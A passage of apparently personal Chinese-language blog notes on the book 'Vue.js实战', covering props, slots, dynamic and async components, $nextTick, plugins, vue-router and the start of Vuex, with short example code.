start=\"3\">\n<li><h3 id=\"使用props传递数据\"><a href=\"#使用props传递数据\" class=\"headerlink\" title=\"使用props传递数据\"></a>使用props传递数据</h3><p>​    1.组件除了复用以外，更重要的是组件之间的通信；props中声明的数据与组件data函数return的数据主要区别是props的来自父级，而data中的组件是自己的数据，作用域是组件本身；这两种数据都可以在template、computed和methods中使用；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component3</span> <span class=\"hljs-attr\">message</span>=<span class=\"hljs-string\">&quot;来自父组件的数据！！&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component3</span>&gt;</span><br><br><br>       Vue.component(&#x27;my-component3&#x27;, &#123;<br>           props: [&#x27;message&#x27;],<br>           template: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;<br>       &#125;);<br></code></pre></td></tr></table></figure>\n\n<p>​    2.小细节</p>\n</li>\n</ol>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\">&lt;my-component2 message=<span class=\"hljs-string\">&quot;[1,2,3]&quot;</span>&gt;&lt;/my-component2&gt;   //messgae.length=<span class=\"hljs-number\">7</span><br>&lt;my-component2 <span class=\"hljs-symbol\">:message=<span class=\"hljs-string\">&quot;[1,2,3]&quot;</span>&gt;&lt;/my-component2&gt;</span>\t//messgae.length=<span class=\"hljs-number\">3</span> 数组长度<br></code></pre></td></tr></table></figure>\n\n<p>​         3.单向数据流：父级-&gt;子级，解耦，避免子级操作父级数据；若props作为需要抓变得原始值，可以用计算属性；</p>\n<p>​         4.数据验证</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;data-validator&#x27;</span>,&#123;<br>          <span class=\"hljs-attr\">props</span>:&#123;<br>              <span class=\"hljs-attr\">propA</span>:<span class=\"hljs-title class_\">Number</span>,<br>              <span class=\"hljs-attr\">propB</span>:[<span class=\"hljs-title class_\">String</span>,<span class=\"hljs-title class_\">Number</span>],<br>              <span class=\"hljs-attr\">propC</span>:&#123;<br>                  <span class=\"hljs-attr\">type</span>:<span class=\"hljs-title class_\">Boolean</span>,<br>                  <span class=\"hljs-attr\">default</span>:<span class=\"hljs-literal\">true</span><br>              &#125;,<br>              <span class=\"hljs-attr\">propD</span>:&#123;<br>                  <span class=\"hljs-attr\">type</span>:<span class=\"hljs-title class_\">Number</span>,<br>                  <span class=\"hljs-attr\">required</span>:<span class=\"hljs-literal\">true</span><br>              &#125;,<br>              <span class=\"hljs-attr\">propE</span>:&#123;<br>                  <span class=\"hljs-attr\">type</span>:<span class=\"hljs-title class_\">Array</span>,<br>                  <span class=\"hljs-attr\">dafault</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                      <span class=\"hljs-keyword\">return</span> [];<br>                  &#125;,<br>              <span class=\"hljs-comment\">//自定义验证器</span><br>              <span class=\"hljs-attr\">propF</span>:&#123;<br>                  <span class=\"hljs-attr\">validator</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">value</span>)&#123;<br>                      <span class=\"hljs-keyword\">return</span> value&gt;<span class=\"hljs-number\">10</span>;<br>                  &#125;<br>              &#125;<br>              &#125;<br>          &#125;<br>      &#125;);<br></code></pre></td></tr></table></figure>\n\n<p>4.组件通信</p>\n<p>​    1.自定义事件：子组件向父组件传递数据</p>\n<p>​    2.双向绑定的v-model组件需要满足下面两个要求：</p>\n<p>​                *接受一个value属性</p>\n<pre><code>           *在有新的value前出发input事件\n</code></pre>\n<p>​    3.使用中央时间总线Bus实现父子，兄弟，跨级的组件间通信</p>\n<p>​    4.父链 this.$parent   this.$children  尽管Vue允许这样的操作，业务中，子组件应该尽可能避免以来父组件的数据（解耦？？）建议使用props和$emit</p>\n<p>​    5.子组件索引：通过$refs来获取子组件实现（注意：$refs只在组件渲染完成之后才填充，并且他是非响应式的。仅仅作为一个应急方案，应当避免再模板和计算属性中使用$refs）</p>\n<h3 id=\"4-使用slot分发内容\"><a href=\"#4-使用slot分发内容\" class=\"headerlink\" title=\"4.使用slot分发内容\"></a>4.使用slot分发内容</h3><p>当需要让组件组合使用，混合父组件的内容和子组件的模板时，用到slot，成为内容分发；</p>\n<p>props传递数据，events触发事件，slot内容分发构成了Vue组建的3个API来源；</p>\n<p>​    1.作用域</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><br>\t&#123;&#123; message &#125;&#125;  //绑定父组件的数据<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span> <span class=\"hljs-attr\">v-show</span>=<span class=\"hljs-string\">&quot;showMe&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span> //绑定的是父组件<br><br>var app=new Vue(&#123;<br>    el:&quot;#app&quot;,<br>    data:&#123;<br>    showMe: True;<br>&#125;<br>&#125;);<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span> <span class=\"hljs-attr\">v-show</span>=<span class=\"hljs-string\">&quot;showMe&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span> //绑定的是子组件<br><br>Vue.component(&#x27;child-component&#x27;,&#123;<br>template:&#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-show</span>=<span class=\"hljs-string\">&quot;showMe&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;,<br>data:function()&#123;<br>\tretunr &#123;<br>\t\t\tshowMe:True<br>&#125;<br>&#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<p>​    2.slot用法</p>\n<p>​                单个slot</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><br>           <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Car~~<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       Vue.component(&#x27;child-component&#x27;, &#123;</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           template: &quot;\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">               <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>您的购物车空空如也！<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">               <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&quot;,</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       &#125;);</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       var app = new Vue(&#123;</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">           el: &quot;#app&quot;,</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">       &#125;)</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">   </span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​                具名slot和单个slot混用</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">child-component</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span> <span class=\"hljs-attr\">slot</span>=<span class=\"hljs-string\">&quot;header&quot;</span>&gt;</span>此去经年<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>从前车马很慢，书信很慢，一生只够爱一个人。<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">slot</span>=<span class=\"hljs-string\">&quot;footer&quot;</span>&gt;</span>Writted By GuiGui<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">child-component</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">        Vue.component(&#x27;child-component&#x27;, &#123;</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">            template: &#x27;\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;container&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;header&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;header&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;main&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&quot;footer&quot;</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">slot</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;footer&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">slot</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\\</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;,</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\">        &#125;);</span></span><br><span class=\"language-xml\"><span class=\"language-handlebars\"></span></span><br></code></pre></td></tr></table></figure>\n\n<p>​    3.作用域插槽：使用一个可复用的模板替代已渲染元素。？？？</p>\n<p>​    4.访问slot：this.$slot.name;</p>\n<h3 id=\"5-组件高级用法\"><a href=\"#5-组件高级用法\" class=\"headerlink\" title=\"5.组件高级用法\"></a>5.组件高级用法</h3><p>​    1.递归组件：组件在他的模板内递归调用自己，只要给组件设置name即可；可以用于开发具未知层级关系的独立组件；</p>\n<p>​    注：必须设置一个条件来限制递归数量，否则抛出错误：max stack size exceeded;</p>\n<p>​    2.内联模板：给组件标签使用inline-template特性，组件会把它的内容当作模板；</p>\n<p>​    3.动态组件：vue.js提供了一个特殊元素&lt;component&gt;用来挂载不同的组件，使用is特性来选择需要挂载的组件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">component</span> <span class=\"hljs-attr\">:is</span>=<span class=\"hljs-string\">&quot;currentChoose&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">component</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleChangeView(&#x27;A&#x27;)&quot;</span>&gt;</span>红灯<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleChangeView(&#x27;B&#x27;)&quot;</span>&gt;</span>黄灯<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleChangeView(&#x27;C&#x27;)&quot;</span>&gt;</span>绿灯<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><br>   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">components</span>:&#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">comA</span>:&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div style=&quot;color: red;&quot;&gt;A组件&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">comB</span>:&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div style=&quot;color: yellow;&quot;&gt;B组件&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">comC</span>:&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div style=&quot;color: green;&quot;&gt;C组件&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">data</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">currentChoose</span>:<span class=\"hljs-string\">&#x27;comA&#x27;</span>,</span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">handleChangeView</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">component</span>)&#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">currentChoose</span>=<span class=\"hljs-string\">&#x27;com&#x27;</span>+component;</span><br><span class=\"language-javascript\">               &#125;,</span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">       &#125;)</span><br><span class=\"language-javascript\">   </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    4.异步组件：仅仅加载需要的组件，提高性能；（vue允许将组件定义为一个工厂函数，动态的解析组件，只在组件需要渲染时触发工厂函数，并且将结果缓存，用于再次渲染）</p>\n<h3 id=\"6其他\"><a href=\"#6其他\" class=\"headerlink\" title=\"6其他\"></a>6其他</h3><p>​    1.$nextTick 异步更新队列：vue仅仅会绘制最后一次改变，英雌因此当showtext=true的时候，其实还没有创建这个div，需要等到下一次刷新；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;div&quot;</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;showText&quot;</span>&gt;</span>This is show me text;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;showMeText&quot;</span>&gt;</span>点击显示文本<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><br>   <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">data</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">showText</span>: <span class=\"hljs-literal\">false</span></span><br><span class=\"language-javascript\">           &#125;,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">showMeText</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">showText</span> = <span class=\"hljs-literal\">true</span>;</span><br><span class=\"language-javascript\">                   <span class=\"hljs-variable language_\">this</span>.$nextTick(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                       <span class=\"hljs-keyword\">var</span> text=<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&#x27;div&#x27;</span>).<span class=\"hljs-property\">innerHTML</span>;</span><br><span class=\"language-javascript\">                       <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(text);</span><br><span class=\"language-javascript\">                   &#125;);</span><br><span class=\"language-javascript\">               &#125;</span><br><span class=\"language-javascript\">           &#125;</span><br><span class=\"language-javascript\">       &#125;)</span><br><span class=\"language-javascript\">   </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    2.手动挂载实例$mount</p>\n"},{"title":"Vue.js实战（8）","date":"2020-12-05T13:18:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n\nCh11 插件\n\n一、插件得创建和使用\n\n```javascript\n //公开的方法install，参数1：VUe构造器，参数2：可选对象     \nMyPlugin.install=function(Vue,options){\n            //全剧注册组件\n            Vue.component('component-name',{\n                //组件内容\n            })\n            //添加实例方法\n            Vue.prototype.$Notice=function(){\n                //逻辑。。\n            }\n            //添加全局方法或属性\n            Vue.globalMethod=function(){\n                //逻辑\n            }\n            //添加全局混合\n            Vue.mixin({\n                mounted:function(){\n                    //逻辑 \n                }\n            })\n        }\n//Vue.use()来使用插件\n        Vue.use(MyPlugin)\n```\n\n二、前端路由与Vue-router\n\n​\t\t1.实现方式\n\n- 利用url得hash，即所谓的锚点（#）\n\n- HTML5得History模式：需要服务器支持\n\n  2.vue-router基本用法\n\n  ```javascript\n  //在webpack项目中安装vue-router\n  npm install --save vue-router\n  \n  import Vue from 'vue'\n  import Router from 'vue-router'\n  \n  Vue.use(Router)\n  \n  //index.js\n  routes: [\n      {\n        path: '/',\n        component: Movie\n      },\n      {\n        path:'/login',\n          //一次性全部加载\n        component:Login\n      },\n      {\n        path:'/test',\n        component:Test\n      },\n      {\n        path:'/index',\n        component:(resolve)=>require(['../components/Index.vue'],resolve)\n      },\n      {\n        path:'/about',\n          //懒加载（按需加载）mwebpack会把每一个路由打包为一个js文件，当请求到该页面时，才会去加载这个页面得js\n        component:(resolve)=>require(['../components/About.vue'],resolve)\n      },\n      //包含了用户Id得路由，指向同一界面；\n       {\n        path:'/user/:id',\n        component:(resolve)=>require(['../components/User.vue'],resolve)\n      }\n    ] \n  \n  \n  ******************************\n  \n  ```\n\n  3.ES6小语法\n\n  在ES6中，使用let和const代替var来声明变量，const声明常量不可修改；\n\n  let和const得作用域是块（使用了异步路由后，编译出的每个js都叫做快（chunk)）；\n\n  4.小细节\n\n  在router.js中，设置mode为history才会开启HTML5得路由模式，通过’/‘设置路径，否则为’#‘\n\n  5.跳转\n\n  ```vue\n  <router-link to=\"/about\">About</router-link>\n  \n      //页面跳转方法2\n      <button @click=\"changeToMain\">Index</button>\n      \n       methods:{\n      changeToMain(){\n        //不可以跳转到当前页面路由本身，会报出冗余错误\n        this.$router.push('/passage');\n      }\n    }\n  ```\n\n  \n\n- tag:tag可以指定渲染成什么标签，比如tag=\"li\",会渲染成li\n\n- replace：使用后不可以使用返回键回到上一个页面\n\n- go:在history记录中向前或者向后退多少步，参数为整数   this.$router.go(-1)或(2)\n\n三、状态\n\n管理与Vuex\n\n​\t1.状态管理与使用场景\n\n```javascript\nnpm install --save vuex\n```\n\n​\t2.Vuex得使用\n\n```javascript\n//main.js\nimport Vuex from 'Vuex'\n\nVue.use(Vuex);\n\nconst store=new Vuex.Store({\n      state:{\n          //定义一个数据\n        \tcount:0\n 